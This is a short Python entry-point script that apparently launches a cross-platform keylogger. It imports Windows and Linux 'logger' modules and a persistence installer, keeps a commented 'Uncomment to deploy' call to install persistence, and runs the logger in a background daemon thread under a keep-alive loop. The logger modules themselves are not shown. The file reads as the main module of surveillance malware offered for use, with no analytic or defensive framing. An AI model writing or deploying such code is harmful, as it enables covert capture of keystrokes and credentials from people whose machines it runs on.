import platform
import threading
from logger_win import run_win_logger
from logger_linux import run_linux_logger
from persistence import install_persistence

def main():
    # install_persistence() # Uncomment to deploy
    if platform.system() == "Windows":
        threading.Thread(target=run_win_logger, daemon=True).start()
    else:
        threading.Thread(target=run_linux_logger, daemon=True).start()
    
    while True: pass # Keep alive

if __name__ == "__main__":
    main()
